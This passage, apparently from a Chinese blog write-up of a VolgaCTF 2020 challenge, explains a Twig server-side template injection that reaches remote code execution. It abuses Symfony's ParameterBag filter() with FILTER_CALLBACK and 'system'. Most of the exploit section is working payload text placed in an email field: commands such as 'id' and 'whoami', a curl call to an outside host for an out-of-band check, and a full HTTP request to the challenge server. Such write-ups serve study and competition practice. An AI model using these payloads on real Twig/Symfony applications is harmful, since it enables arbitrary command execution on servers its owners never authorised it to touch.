+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">(string $key, $default = null, int $filter = FILTER_DEFAULT, $options = [])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $value = <span class="keyword">$this</span>-&gt;get($key, $default);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Always turn $options into an array - this allows filter_var option shortcuts.</span></span><br><span class="line">        <span class="keyword">if</span> (!\is_array($options) &amp;&amp; $options) &#123;</span><br><span class="line">            $options = [<span class="string">'flags'</span> =&gt; $options];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Add a convenience check for arrays.</span></span><br><span class="line">        <span class="keyword">if</span> (\is_array($value) &amp;&amp; !<span class="keyword">isset</span>($options[<span class="string">'flags'</span>])) &#123;</span><br><span class="line">            $options[<span class="string">'flags'</span>] = FILTER_REQUIRE_ARRAY;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> filter_var($value, $filter, $options);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">(string $key, $default = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> \array_key_exists($key, <span class="keyword">$this</span>-&gt;parameters) ? <span class="keyword">$this</span>-&gt;parameters[$key] : $default;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p><code>$this-parameters</code> 会在query 初始化的时候赋值<code>$this-&gt;query = new ParameterBag($query);</code> 就是<code>$_GET</code></p>
+<p>到这里就是<code>filter_var($value, $filter, $options)</code> 中的三个参数都能控制</p>
+<p><img src="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330124846240.png" alt="image-20200330124846240"></p>
+<p>可以设置个回调函数为system，<code>FILTER_CALLBACK</code> 的值为1024</p>
+<blockquote>
+<p>php &gt; echo FILTER_CALLBACK;<br>1024<br>php &gt;</p>
+</blockquote>
+<p>数组参数可以通过<code>{&#39;key&#39;:&#39;value&#39;}</code>传递。</p>
+<p>所以payload 可以这样构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;{{app.request.query.filter(0,&apos;id&apos;,1024,&#123;&apos;options&apos;:&apos;system&apos;&#125;)}}&quot;@sometimenaive.com</span><br></pre></td></tr></table></figure>
+<p>这样可以执行成功</p>
+<p><img src="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330130804980.png" alt="image-20200330130804980"></p>
+<p>但是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;{{app.request.query.filter(0,&apos;whoami&apos;,1024,&#123;&apos;options&apos;:&apos;system&apos;&#125;)}}&quot;.&quot;&quot;@sometimenaive.com</span><br></pre></td></tr></table></figure>
+<p>远程爆500.，可能是发邮件的时候GG了。应该就是发邮件的时候有问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;{{app.request.query.filter(0,&apos;curl$&#123;IFS&#125;x.x.x.x:8090&apos;,1024,&#123;&apos;options&apos;:&apos;system&apos;&#125;)}}&quot;.&quot;&quot;@sometimenaive.com</span><br></pre></td></tr></table></figure>
+<p>上面的payload虽然爆500但是还是可以接收到请求的。</p>
+<p><img src="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330131712638.png" alt="image-20200330131712638"></p>
+<p>上面是使用默认值给system传参数，如果通过GET传参数的方式，可以有回显的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /subscribe?0=whoami HTTP/1.1</span><br><span class="line">Host: newsletter.q.2020.volgactf.ru</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 85</span><br><span class="line">Origin: http://newsletter.q.2020.volgactf.ru</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://newsletter.q.2020.volgactf.ru/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">email=&quot;{{app.request.query.filter(0,0,1024,&#123;&apos;options&apos;:&apos;system&apos;&#125;)}}&quot;@x.com</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330132002996.png" alt="image-20200330132002996"></p>
+<p>当然<code>app.request.request</code> 应该也是可以的。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a href="https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html" target="_blank" rel="noopener">https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/php/" rel="tag"># php</a>
+            
+              <a href="/tags/ssti/" rel="tag"># ssti</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/12/09/thinkphp-6.0-new-pop-gadget/" rel="next" title="thinkphp-6.0-new-pop-gadget">
+                  <i class="fa fa-chevron-left"></i> thinkphp-6.0-new-pop-gadget
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2020/04/10/twig3.x-ssti-payloads/" rel="prev" title="TWIG 全版本通用 SSTI payloads">
+                  TWIG 全版本通用 SSTI payloads <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述"><span class="nav-number">1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方法"><span class="nav-number">2.</span> <span class="nav-text">利用方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#任意文件读取"><span class="nav-number">2.1.</span> <span class="nav-text">任意文件读取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RCE"><span class="nav-number">2.2.</span> <span class="nav-text">RCE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">3.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">yxxx</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">tags</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yxxx</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
